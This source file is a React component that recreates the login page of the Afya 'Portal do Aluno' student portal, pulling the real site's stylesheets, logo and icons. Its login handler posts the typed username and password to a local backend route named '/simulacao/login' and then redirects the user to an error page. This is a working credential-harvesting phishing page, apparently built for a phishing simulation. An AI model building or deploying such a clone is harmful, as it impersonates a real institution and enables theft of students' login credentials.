import { type FormEvent, useEffect, useState } from "react";
import "./Styles/animacao.css"
import "./Styles/customProviders.css"
import "./Styles/style.css"
import "./Styles/toaster.min.css"
import { useNavigate } from 'react-router-dom';

const BASE = "https://portalaluno.afya.com.br/web/app/edu/PortalEducacional";
const LOGIN = `${BASE}/login`;

const strings = {
  portalAluno: "Portal do Aluno",
  usuario: "Usuário",
  senha: "Senha",
  alias: "Alias",
  acessar: "Acessar",
  esqueceuSenha: "Esqueceu sua senha?",
  continuar: "Continuar",
  voltarLogin: "Voltar para realizar login",
  email: "E-mail",
  senha1: "Nova senha",
  senha2: "Confirmar nova senha",
  senhaAntiga: "Senha antiga",
  salvar: "Salvar",
  vincularContas: "Vincular contas",
  usuarioNaoAssociado: "Usuário não associado.",
  fiqueTranquilo: "Fique tranquilo. Informe seus dados para associar as contas.",
  associarContas: "Associar contas",
  loading: "Carregando...",
  dispositivoMobile: "Dispositivo mobile",
  msgMobile1: "Detectamos que você está acessando por um dispositivo móvel.",
  msgMobile2: "Você pode acessar a versão mobile ou continuar no portal.",
  acessarMobile: "Acessar versão mobile",
  continuarPortal: "Continuar no portal",
};

type View = "login" | "recover" | "newPassword" | "changePassword";

function Icon({ name, fallback, alt }: { name: string; fallback: string; alt: string }) {
  return (
    <object
      data={`${LOGIN}/assets/img/${name}.svg`}
      width="26px"
      height="26px"
      type="image/svg+xml"
      aria-label={alt}
    >
      <img src={`${LOGIN}/assets/img/${fallback}.png`} alt={alt} />
    </object>
  );
}

export default function PortalAluno() {
  const [view, setView] = useState<View>("login");
  const [showPopup, setShowPopup] = useState(true);
  const [showLinkModal, setShowLinkModal] = useState(false);
  const [showMobileModal, setShowMobileModal] = useState(false);
  const [pendingRequests] = useState(0);

  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [alias, setAlias] = useState("");
  const [userRecover, setUserRecover] = useState("");
  const [emailRecover, setEmailRecover] = useState("");
  const [oldPass, setOldPass] = useState("");
  const [newPass, setNewPass] = useState("");
  const [newPass2, setNewPass2] = useState("");

   const navigate = useNavigate();

  // O HTML fornecido dependia do controller AngularJS para preencher aliases e OAuth.
  const aliases: string[] = [];
  const oauthProviders: Array<{ id: string; name: string }> = [];

  useEffect(() => {
    document.title = "Portal do Aluno";

    const hrefs = [
      "https://portalaluno.afya.com.br/web/js/libs/bootstrap/dist/css/bootstrap.min.css",
      `${LOGIN}/assets/css/animacao.css`,
      "https://portalaluno.afya.com.br/web/js/libs/AngularJS-Toaster/toaster.min.css",
      `${LOGIN}/assets/css/style.css`,
      `${LOGIN}/assets/css/customProviders.css`,
    ];

    const links = hrefs.map((href) => {
      const el = document.createElement("link");
      el.rel = "stylesheet";
      el.href = href;
      el.dataset.portalAlunoReact = "true";
      document.head.appendChild(el);
      return el;
    });

    const favicon = document.createElement("link");
    favicon.rel = "shortcut icon";
    favicon.type = "image/x-icon";
    favicon.href = `${BASE}/assets/img/favicon.ico`;
    favicon.dataset.portalAlunoReact = "true";
    document.head.appendChild(favicon);

    return () => {
      links.forEach((link) => link.remove());
      favicon.remove();
    };
  }, []);

  function preventSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
  }

  async function handleLogin(
  event: FormEvent<HTMLFormElement>
) {
  event.preventDefault();

  console.log("ENVIANDO:", user);

  try {
    const response = await fetch(
      "http://localhost:3000/simulacao/login",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          usuario: user,
          senhaInformada: pass
        })
      }
    );

    if (!response.ok) {
      throw new Error("Erro ao registrar simulação");
    }

    const resultado = await response.json();

    console.log(resultado);

    navigate('/erro');

    
    
  } catch (error) {
    console.error(
      "Erro ao conectar com o backend:",
      error
    );
  }
}

  return (
    <div className="portal-aluno-react">
      {showPopup && (
        <div
          className="modal fade in"
          id="myModal"
          role="dialog"
          aria-modal="true"
          style={{ display: "block" }}
          onClick={(e) => {
            if (e.currentTarget === e.target) setShowPopup(false);
          }}
        >
          <div className="modal-dialog">
            <center>
              <div className="modal-body">
                <div>
                  <img
                    src={`${LOGIN}/POPUPLOGIN.png`}
                    alt=""
                    className="inner-image"
                    width="90%"
                    height="90%"
                  />{" "}
                  <img src={`${LOGIN}/pic.png`} alt="" />
                </div>
              </div>
            </center>
          </div>
        </div>
      )}

      {showLinkModal && (
        <div className="modal fade in" id="modalLogin" role="dialog" style={{ display: "block" }}>
          <div className="modal-dialog modal-md" role="document">
            <div className="modal-content">
              <div className="modal-header header-login">
                <button type="button" className="close" aria-label="Close" onClick={() => setShowLinkModal(false)}>
                  <span aria-hidden="true">×</span>
                </button>
                <h4 className="modal-title" id="modalLoginLabel">{strings.vincularContas}</h4>
              </div>
              <div className="modal-body body-login">
                <div className="row">
                  <div className="col-md-12 col-lg-12 col-xs-12 col-sm-12 login">
                    <div className="form__field">
                      {strings.usuarioNaoAssociado}
                      <br /><br />
                      {strings.fiqueTranquilo}
                    </div>
                    <div className="form__field">
                      <label htmlFor="User2">
                        <Icon name="user" fallback="user" alt="user.svg" />
                        <span className="hidden">{strings.usuario}</span>
                      </label>
                      <input
                        id="User2"
                        value={user}
                        onChange={(e) => setUser(e.target.value)}
                        type="text"
                        tabIndex={5}
                        name="User"
                        className="form__input"
                        placeholder={strings.usuario}
                        required
                      />
                    </div>
                    <div className="form__field">
                      <label htmlFor="Pass2">
                        <Icon name="senha" fallback="senha" alt="senha.svg" />
                        <span className="hidden">{strings.senha}</span>
                      </label>
                      <input
                        id="Pass2"
                        value={pass}
                        onChange={(e) => setPass(e.target.value)}
                        type="password"
                        tabIndex={6}
                        name="Pass"
                        className="form__input"
                        placeholder={strings.senha}
                        required
                      />
                    </div>
                    {aliases.length > 0 && view !== "changePassword" && (
                      <div className="form__field">
                        <label htmlFor="Alias2">
                          <Icon name="alias" fallback="alias" alt="alias.svg" />
                          <span className="hidden">{strings.alias}</span>
                        </label>
                        <select
                          id="Alias2"
                          name="Alias"
                          tabIndex={7}
                          className="form__input selection"
                          value={alias}
                          onChange={(e) => setAlias(e.target.value)}
                          required
                        >
                          <option value="" />
                          {aliases.map((item) => <option key={item} value={item}>{item}</option>)}
                        </select>
                      </div>
                    )}
                  </div>
                </div>
                <br />
              </div>
              <div className="modal-footer login">
                <input type="button" tabIndex={8} value={strings.associarContas} onClick={() => setShowLinkModal(false)} />
              </div>
            </div>
          </div>
        </div>
      )}

      <div className="container">
        {pendingRequests > 0 && (
          <div id="loading-screen" className="overlay">
            <img src={`${BASE}/assets/img/loading.gif`} alt="" />
            <p className="text-center text-muted">{strings.loading}</p>
          </div>
        )}

        <div className="logo animated fadeInDown">
          <img src={`${LOGIN}/assets/img/logo-responsivo.png`} alt="marca" />
        </div>

        <div className="login-box animated fadeInDown">
          <div className="box-header">
            <h1>{strings.portalAluno}</h1>
          </div>

          {view === "login" && (
            <form name="formLogin" method="POST" className="form login" onSubmit={handleLogin}>
              <div className="form__field">
                <label htmlFor="User">
                  <Icon name="user" fallback="user" alt="user.svg" />
                  <span className="hidden">{strings.usuario}</span>
                </label>
                <input
                  id="User"
                  value={user}
                  onChange={(e) => setUser(e.target.value)}
                  type="text"
                  tabIndex={1}
                  name="User"
                  className="form__input"
                  placeholder={strings.usuario}
                  required
                />
              </div>

              <div className="form__field">
                <label htmlFor="Pass">
                  <Icon name="senha" fallback="senha" alt="senha.svg" />
                  <span className="hidden">{strings.senha}</span>
                </label>
                <input
                  id="Pass"
                  value={pass}
                  onChange={(e) => setPass(e.target.value)}
                  type="password"
                  tabIndex={2}
                  name="Pass"
                  className="form__input"
                  placeholder={strings.senha}
                  required
                />
              </div>

              {aliases.length > 0 && (
                <div className="form__field">
                  <label htmlFor="Alias">
                    <Icon name="alias" fallback="alias" alt="alias.svg" />
                    <span className="hidden">{strings.alias}</span>
                  </label>
                  <select
                    id="Alias"
                    name="Alias"
                    tabIndex={3}
                    className="form__input selection"
                    value={alias}
                    onChange={(e) => setAlias(e.target.value)}
                    required
                  >
                    <option value="" />
                    {aliases.map((item) => <option key={item} value={item}>{item}</option>)}
                  </select>
                </div>
              )}

              <div className="form__field">
                <input type="submit" tabIndex={4} value={strings.acessar} />
              </div>

              {oauthProviders.length > 0 && (
                <div>
                  <p style={{ color: "white" }}>Ou acesse via serviço externo</p>
                  {oauthProviders.map((provider) => (
                    <p key={provider.id}>
                      <span className="custom-button">
                        <span className="custom-button-wrapper">
                          <span className="custom-button-text">{provider.name}</span>
                        </span>
                      </span>
                    </p>
                  ))}
                </div>
              )}

              <p className="small">
                <a
                  href="#"
                  tabIndex={5}
                  onClick={(e) => {
                    e.preventDefault();
                    setView("recover");
                  }}
                >
                  {strings.esqueceuSenha}
                </a>
              </p>
            </form>
          )}

          {view === "recover" && (
            <>
              <div className="box-title"><h2>{strings.esqueceuSenha}</h2></div>
              <form name="formRecover" className="form login" onSubmit={preventSubmit}>
                <div className="form__field">
                  <label htmlFor="UserRecover">
                    <Icon name="user" fallback="user" alt="user.svg" />
                    <span className="hidden">{strings.usuario}</span>
                  </label>
                  <input
                    id="UserRecover"
                    value={userRecover}
                    onChange={(e) => setUserRecover(e.target.value)}
                    type="text"
                    tabIndex={1}
                    name="UserRecover"
                    className="form__input"
                    placeholder={strings.usuario}
                    required
                  />
                </div>

                <div className="form__field">
                  <label htmlFor="Email">
                    <Icon name="email" fallback="email" alt="email.svg" />
                    <span className="hidden">{strings.email}</span>
                  </label>
                  <input
                    id="Email"
                    value={emailRecover}
                    onChange={(e) => setEmailRecover(e.target.value)}
                    type="email"
                    tabIndex={1}
                    name="Email"
                    className="form__input"
                    placeholder={strings.email}
                    required
                  />
                </div>

                <div className="form__field">
                  <input type="submit" tabIndex={4} value={strings.continuar} />
                </div>
                <p className="small">
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      setView("login");
                    }}
                  >{strings.voltarLogin}</a>
                </p>
              </form>
            </>
          )}

          {view === "newPassword" && (
            <form name="formNewPassword" className="form login" onSubmit={preventSubmit}>
              <div className="form__field">
                <label htmlFor="PassRecover">
                  <Icon name="senha" fallback="senha" alt="senha.svg" />
                  <span className="hidden">{strings.senha1}</span>
                </label>
                <input
                  id="PassRecover"
                  value={newPass}
                  onChange={(e) => setNewPass(e.target.value)}
                  type="password"
                  tabIndex={2}
                  name="PassRecover"
                  className="form__input"
                  placeholder={strings.senha1}
                  required
                />
              </div>
              <div className="form__field">
                <label htmlFor="PassRecover2">
                  <Icon name="senha" fallback="senha" alt="senha.svg" />
                  <span className="hidden">{strings.senha2}</span>
                </label>
                <input
                  id="PassRecover2"
                  value={newPass2}
                  onChange={(e) => setNewPass2(e.target.value)}
                  type="password"
                  tabIndex={2}
                  name="PassRecover2"
                  className="form__input"
                  placeholder={strings.senha2}
                  required
                />
              </div>
              <div className="form__field"><input type="submit" tabIndex={4} value={strings.continuar} /></div>
            </form>
          )}

          {view === "changePassword" && (
            <form name="formAlterarSenha" className="form login" onSubmit={preventSubmit}>
              <div className="form__field">
                <label htmlFor="usuario">
                  <Icon name="user" fallback="user" alt="user.svg" />
                  <span className="hidden">{strings.usuario}</span>
                </label>
                <input id="usuario" value={user} onChange={(e) => setUser(e.target.value)} type="text" tabIndex={1} name="usuario" className="form__input" placeholder={strings.usuario} required />
              </div>
              <div className="form__field">
                <label htmlFor="OldPass">
                  <Icon name="senha" fallback="senha" alt="senha.svg" />
                  <span className="hidden">{strings.senhaAntiga}</span>
                </label>
                <input id="OldPass" value={oldPass} onChange={(e) => setOldPass(e.target.value)} type="password" tabIndex={2} name="OldPass" className="form__input" placeholder={strings.senhaAntiga} required />
              </div>
              <div className="form__field">
                <label htmlFor="ChangePass1"><Icon name="senha" fallback="senha" alt="senha.svg" /><span className="hidden">{strings.senha1}</span></label>
                <input id="ChangePass1" value={newPass} onChange={(e) => setNewPass(e.target.value)} type="password" tabIndex={3} className="form__input" placeholder={strings.senha1} required />
              </div>
              <div className="form__field">
                <label htmlFor="ChangePass2"><Icon name="senha" fallback="senha" alt="senha.svg" /><span className="hidden">{strings.senha2}</span></label>
                <input id="ChangePass2" value={newPass2} onChange={(e) => setNewPass2(e.target.value)} type="password" tabIndex={4} className="form__input" placeholder={strings.senha2} required />
              </div>
              <div className="form__field"><input type="submit" tabIndex={5} value={strings.salvar} /></div>
            </form>
          )}
        </div>
      </div>

      {showMobileModal && (
        <div className="modal fade in" id="modalMobileDetect" role="dialog" style={{ display: "block" }}>
          <div className="modal-dialog modal-lg" role="document">
            <div className="modal-content">
              <div className="modal-header">
                <h4 className="modal-title text-center">{strings.dispositivoMobile}</h4>
              </div>
              <div className="modal-body">
                <div className="panel-body">
                  <p>{strings.msgMobile1}</p>
                  <p>{strings.msgMobile2}</p>
                </div>
              </div>
              <div className="modal-footer">
                <button type="button" className="btn btn-acessar-mobile">
                  <span>{strings.acessarMobile}</span>{" "}
                  <Icon name="mobile" fallback="mobile" alt="mobile.svg" />
                </button>
                <button type="button" className="btn btn-continuar-site" onClick={() => setShowMobileModal(false)}>
                  {strings.continuarPortal}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Mantidos como estados/handlers React. Ative conforme sua aplicação fornecer esses fluxos. */}
      <button type="button" hidden onClick={() => setShowLinkModal(true)}>Abrir vínculo</button>
      <button type="button" hidden onClick={() => setShowMobileModal(true)}>Abrir mobile</button>
      <button type="button" hidden onClick={() => setView("newPassword")}>Nova senha</button>
      <button type="button" hidden onClick={() => setView("changePassword")}>Alterar senha</button>
    </div>
  );
}
